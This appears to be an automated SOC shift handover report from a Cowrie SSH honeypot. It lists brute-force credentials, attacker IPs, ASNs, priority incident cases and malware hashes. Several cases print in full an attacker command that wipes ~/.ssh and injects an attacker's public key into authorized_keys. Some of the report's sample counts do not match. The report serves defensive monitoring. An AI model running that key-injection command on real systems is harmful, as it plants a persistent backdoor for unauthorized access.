# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-26 |
| **Generated At** | 2026-03-26T05:40:59Z |
| **Shift Time** | 05:40 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **132** |
| Confirmed Threats | **109** |
| False Positives Filtered | **23** (17.4%) |
| Unique Attacker IPs | **64** |
| Countries of Origin | **26** |
| High Severity Cases | **11** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **121** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **98** |
| Unique Credential Pairs | **77** |
| Unique Usernames | **64** |
| Unique Passwords | **60** |
| Successful Auth Pairs | **11** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 11 |
| `345gs5662d34` | 4 |
| `admin` | 3 |
| `il` | 3 |
| `vmutil` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123` | 5 |
| `1234` | 5 |
| `345gs5662d34` | 4 |
| `3245gs5662d34` | 4 |
| `12345678` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 4 |
| `root` | `3245gs5662d34` | 4 |
| `il` | `il` | 3 |
| `vmutil` | `vmutil` | 3 |
| `jzapata` | `jzapata` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `voip123` | `197.248.8.33` | 2026-03-26T02:46:03 |
| `root` | `3245gs5662d34` | `197.248.8.33` | 2026-03-26T02:46:09 |
| `root` | `voip123` | `186.233.118.22` | 2026-03-26T02:49:20 |
| `root` | `3245gs5662d34` | `186.233.118.22` | 2026-03-26T02:49:27 |
| `root` | `testtest` | `61.23.36.232` | 2026-03-26T02:49:55 |
| `root` | `3245gs5662d34` | `61.23.36.232` | 2026-03-26T02:49:59 |
| `root` | `ABcd1234` | `181.205.51.98` | 2026-03-26T03:11:32 |
| `root` | `656565` | `46.59.109.186` | 2026-03-26T03:32:13 |
| `root` | `656565` | `122.186.18.3` | 2026-03-26T03:32:20 |
| `root` | `Q1w2e3r4` | `70.54.182.130` | 2026-03-26T04:17:48 |
| `root` | `3245gs5662d34` | `70.54.182.130` | 2026-03-26T04:17:54 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `186.233.118.22`, `61.23.36.232`, `70.54.182.130`, `197.248.8.33`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **64** |
| Unique ASNs | **53** |
| High-Risk ASNs | **39** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 3 | HIGH |
| `AS46562` | Performive LLC | 3 | MEDIUM |
| `AS12389` | PJSC Rostelecom | 2 | HIGH |
| `AS9824` | JCOM Co., Ltd. | 2 | HIGH |
| `AS16509` | Amazon.com, Inc. | 2 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS30988` | IS InternetSolutions Limited | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (11)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-f176dfdada0a

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-03-26 02:46 |
| **Last Seen** | 2026-03-26 02:46 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 02:46:02` | `cowrie.session.connect` |
| `2026-03-26 02:46:02` | `cowrie.client.version` |
| `2026-03-26 02:46:02` | `cowrie.client.kex` |
| `2026-03-26 02:46:03` | `cowrie.login.success` |
| `2026-03-26 02:46:04` | `cowrie.session.params` |
| `2026-03-26 02:46:04` | `cowrie.command.input` |
| `2026-03-26 02:46:04` | `cowrie.command.failed` |
| `2026-03-26 02:46:04` | `cowrie.log.closed` |
| `2026-03-26 02:46:04` | `cowrie.session.params` |
| `2026-03-26 02:46:04` | `cowrie.command.input` |
| `2026-03-26 02:46:05` | `cowrie.session.file_download` |
| `2026-03-26 02:46:05` | `cowrie.log.closed` |
| `2026-03-26 02:46:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bce213a7a6f6

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-03-26 02:46 |
| **Last Seen** | 2026-03-26 02:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 02:46:07` | `cowrie.session.connect` |
| `2026-03-26 02:46:07` | `cowrie.client.version` |
| `2026-03-26 02:46:08` | `cowrie.client.kex` |
| `2026-03-26 02:46:09` | `cowrie.login.success` |
| `2026-03-26 02:46:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fee5c7d68a9c

| Field | Detail |
|---|---|
| **Source IP** | `186.233.118[.]22` |
| **First Seen** | 2026-03-26 02:49 |
| **Last Seen** | 2026-03-26 02:49 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 02:49:18` | `cowrie.session.connect` |
| `2026-03-26 02:49:18` | `cowrie.client.version` |
| `2026-03-26 02:49:19` | `cowrie.client.kex` |
| `2026-03-26 02:49:20` | `cowrie.login.success` |
| `2026-03-26 02:49:21` | `cowrie.session.params` |
| `2026-03-26 02:49:21` | `cowrie.command.input` |
| `2026-03-26 02:49:21` | `cowrie.command.failed` |
| `2026-03-26 02:49:21` | `cowrie.log.closed` |
| `2026-03-26 02:49:22` | `cowrie.session.params` |
| `2026-03-26 02:49:22` | `cowrie.command.input` |
| `2026-03-26 02:49:22` | `cowrie.session.file_download` |
| `2026-03-26 02:49:22` | `cowrie.log.closed` |
| `2026-03-26 02:49:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.233.118[.]22` to AbuseIPDB if not already reported
- [ ] Block `186.233.118[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b32afee1ffa

| Field | Detail |
|---|---|
| **Source IP** | `186.233.118[.]22` |
| **First Seen** | 2026-03-26 02:49 |
| **Last Seen** | 2026-03-26 02:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 02:49:26` | `cowrie.session.connect` |
| `2026-03-26 02:49:26` | `cowrie.client.version` |
| `2026-03-26 02:49:26` | `cowrie.client.kex` |
| `2026-03-26 02:49:27` | `cowrie.login.success` |
| `2026-03-26 02:49:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.233.118[.]22` to AbuseIPDB if not already reported
- [ ] Block `186.233.118[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52cb3352aa2f

| Field | Detail |
|---|---|
| **Source IP** | `61.23.36[.]232` |
| **First Seen** | 2026-03-26 02:49 |
| **Last Seen** | 2026-03-26 02:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 02:49:54` | `cowrie.session.connect` |
| `2026-03-26 02:49:54` | `cowrie.client.version` |
| `2026-03-26 02:49:54` | `cowrie.client.kex` |
| `2026-03-26 02:49:55` | `cowrie.login.success` |
| `2026-03-26 02:49:55` | `cowrie.session.params` |
| `2026-03-26 02:49:55` | `cowrie.command.input` |
| `2026-03-26 02:49:55` | `cowrie.command.failed` |
| `2026-03-26 02:49:56` | `cowrie.log.closed` |
| `2026-03-26 02:49:56` | `cowrie.session.params` |
| `2026-03-26 02:49:56` | `cowrie.command.input` |
| `2026-03-26 02:49:56` | `cowrie.session.file_download` |
| `2026-03-26 02:49:56` | `cowrie.log.closed` |
| `2026-03-26 02:49:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.23.36[.]232` to AbuseIPDB if not already reported
- [ ] Block `61.23.36[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e34f1b760ccf

| Field | Detail |
|---|---|
| **Source IP** | `61.23.36[.]232` |
| **First Seen** | 2026-03-26 02:49 |
| **Last Seen** | 2026-03-26 02:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 02:49:58` | `cowrie.session.connect` |
| `2026-03-26 02:49:58` | `cowrie.client.version` |
| `2026-03-26 02:49:58` | `cowrie.client.kex` |
| `2026-03-26 02:49:59` | `cowrie.login.success` |
| `2026-03-26 02:49:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.23.36[.]232` to AbuseIPDB if not already reported
- [ ] Block `61.23.36[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d555bf98776

| Field | Detail |
|---|---|
| **Source IP** | `181.205.51[.]98` |
| **First Seen** | 2026-03-26 03:11 |
| **Last Seen** | 2026-03-26 03:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 03:11:29` | `cowrie.session.connect` |
| `2026-03-26 03:11:30` | `cowrie.client.version` |
| `2026-03-26 03:11:30` | `cowrie.client.kex` |
| `2026-03-26 03:11:32` | `cowrie.login.success` |
| `2026-03-26 03:11:33` | `cowrie.direct-tcpip.request` |
| `2026-03-26 03:11:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.205.51[.]98` to AbuseIPDB if not already reported
- [ ] Block `181.205.51[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd1fd534625f

| Field | Detail |
|---|---|
| **Source IP** | `46.59.109[.]186` |
| **First Seen** | 2026-03-26 03:32 |
| **Last Seen** | 2026-03-26 03:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 03:32:11` | `cowrie.session.connect` |
| `2026-03-26 03:32:12` | `cowrie.client.version` |
| `2026-03-26 03:32:12` | `cowrie.client.kex` |
| `2026-03-26 03:32:13` | `cowrie.login.success` |
| `2026-03-26 03:32:13` | `cowrie.direct-tcpip.request` |
| `2026-03-26 03:32:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.59.109[.]186` to AbuseIPDB if not already reported
- [ ] Block `46.59.109[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05523d8e9393

| Field | Detail |
|---|---|
| **Source IP** | `122.186.18[.]3` |
| **First Seen** | 2026-03-26 03:32 |
| **Last Seen** | 2026-03-26 03:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 03:32:19` | `cowrie.session.connect` |
| `2026-03-26 03:32:19` | `cowrie.client.version` |
| `2026-03-26 03:32:19` | `cowrie.client.kex` |
| `2026-03-26 03:32:20` | `cowrie.login.success` |
| `2026-03-26 03:32:21` | `cowrie.direct-tcpip.request` |
| `2026-03-26 03:32:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.186.18[.]3` to AbuseIPDB if not already reported
- [ ] Block `122.186.18[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7ef8fd7af3c

| Field | Detail |
|---|---|
| **Source IP** | `70.54.182[.]130` |
| **First Seen** | 2026-03-26 04:17 |
| **Last Seen** | 2026-03-26 04:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 04:17:46` | `cowrie.session.connect` |
| `2026-03-26 04:17:46` | `cowrie.client.version` |
| `2026-03-26 04:17:46` | `cowrie.client.kex` |
| `2026-03-26 04:17:48` | `cowrie.login.success` |
| `2026-03-26 04:17:48` | `cowrie.session.params` |
| `2026-03-26 04:17:48` | `cowrie.command.input` |
| `2026-03-26 04:17:48` | `cowrie.command.failed` |
| `2026-03-26 04:17:48` | `cowrie.log.closed` |
| `2026-03-26 04:17:49` | `cowrie.session.params` |
| `2026-03-26 04:17:49` | `cowrie.command.input` |
| `2026-03-26 04:17:49` | `cowrie.session.file_download` |
| `2026-03-26 04:17:49` | `cowrie.log.closed` |
| `2026-03-26 04:17:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.54.182[.]130` to AbuseIPDB if not already reported
- [ ] Block `70.54.182[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbad2cceb1aa

| Field | Detail |
|---|---|
| **Source IP** | `70.54.182[.]130` |
| **First Seen** | 2026-03-26 04:17 |
| **Last Seen** | 2026-03-26 04:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 04:17:52` | `cowrie.session.connect` |
| `2026-03-26 04:17:52` | `cowrie.client.version` |
| `2026-03-26 04:17:53` | `cowrie.client.kex` |
| `2026-03-26 04:17:54` | `cowrie.login.success` |
| `2026-03-26 04:17:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.54.182[.]130` to AbuseIPDB if not already reported
- [ ] Block `70.54.182[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `18.116.101[.]220` | **6** | 2026-03-26 03:44 | 2026-03-26 03:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `197.248.8[.]33` | **6** | 2026-03-26 02:42 | 2026-03-26 02:47 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `3.130.168[.]2` | **6** | 2026-03-26 04:14 | 2026-03-26 04:18 | 0m | 0 | `T1592` | 🟢 LOW |
| `102.140.97[.]134` | **5** | 2026-03-26 02:58 | 2026-03-26 03:12 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `161.10.232[.]184` | **5** | 2026-03-26 04:02 | 2026-03-26 04:14 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `186.10.86[.]130` | **5** | 2026-03-26 05:04 | 2026-03-26 05:17 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `186.233.118[.]22` | **5** | 2026-03-26 02:42 | 2026-03-26 02:53 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `186.68.83[.]104` | **5** | 2026-03-26 03:59 | 2026-03-26 04:09 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `34.71.111[.]34` | **5** | 2026-03-26 04:33 | 2026-03-26 04:41 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `61.23.36[.]232` | **5** | 2026-03-26 02:44 | 2026-03-26 02:54 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `70.54.182[.]130` | **5** | 2026-03-26 04:07 | 2026-03-26 04:20 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `101.47.142[.]220` | **4** | 2026-03-26 03:56 | 2026-03-26 04:10 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `205.254.166[.]5` | **3** | 2026-03-26 03:58 | 2026-03-26 04:10 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `118.179.102[.]248` | **2** | 2026-03-26 05:35 | 2026-03-26 05:39 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `39.107.96[.]168` | **2** | 2026-03-26 03:47 | 2026-03-26 03:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.119.126[.]20` | **2** | 2026-03-26 02:55 | 2026-03-26 03:05 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.13.4[.]128` | 1 | 2026-03-26 03:18 | 2026-03-26 03:19 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.167.95[.]242` | 1 | 2026-03-26 04:47 | 2026-03-26 04:47 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.3.43[.]242` | 1 | 2026-03-26 04:34 | 2026-03-26 04:34 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.70.32[.]2` | 1 | 2026-03-26 03:39 | 2026-03-26 03:39 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `119.201.59[.]224` | 1 | 2026-03-26 02:11 | 2026-03-26 02:11 | 12s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.241.79[.]66` | 1 | 2026-03-26 05:09 | 2026-03-26 05:10 | 64s | 1 | `T1110.001` | 🟢 LOW |
| `120.243.121[.]22` | 1 | 2026-03-26 02:37 | 2026-03-26 02:37 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `124.123.77[.]62` | 1 | 2026-03-26 04:10 | 2026-03-26 04:10 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `152.52.236[.]2` | 1 | 2026-03-26 05:36 | 2026-03-26 05:36 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `175.198.110[.]15` | 1 | 2026-03-26 05:14 | 2026-03-26 05:14 | 13s | 0 | `T1592` | 🟢 LOW |
| `180.153.91[.]15` | 1 | 2026-03-26 04:02 | 2026-03-26 04:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.184.84[.]77` | 1 | 2026-03-26 05:39 | 2026-03-26 05:39 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.61[.]139` | 1 | 2026-03-26 03:22 | 2026-03-26 03:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.255.212[.]178` | 1 | 2026-03-26 04:54 | 2026-03-26 04:55 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `190.216.132[.]17` | 1 | 2026-03-26 05:25 | 2026-03-26 05:26 | 12s | 0 | `T1592` | 🟢 LOW |
| `2.55.126[.]88` | 1 | 2026-03-26 02:17 | 2026-03-26 02:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `218.200.200[.]92` | 1 | 2026-03-26 04:55 | 2026-03-26 04:55 | 7s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.58.73[.]238` | 1 | 2026-03-26 03:55 | 2026-03-26 03:55 | 10s | 0 | `T1592` | 🟢 LOW |
| `222.174.184[.]86` | 1 | 2026-03-26 05:29 | 2026-03-26 05:29 | 6s | 0 | `T1592` | 🟢 LOW |
| `27.123.102[.]122` | 1 | 2026-03-26 02:16 | 2026-03-26 02:16 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `27.137.233[.]190` | 1 | 2026-03-26 04:03 | 2026-03-26 04:03 | 12s | 0 | `T1592` | 🟢 LOW |
| `59.120.8[.]61` | 1 | 2026-03-26 04:20 | 2026-03-26 04:20 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `59.26.192[.]111` | 1 | 2026-03-26 03:19 | 2026-03-26 03:19 | 13s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]74` | 1 | 2026-03-26 03:32 | 2026-03-26 03:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.12.240[.]14` | 1 | 2026-03-26 03:59 | 2026-03-26 03:59 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `87.103.126[.]54` | 1 | 2026-03-26 05:16 | 2026-03-26 05:16 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `87.117.32[.]22` | 1 | 2026-03-26 05:01 | 2026-03-26 05:01 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
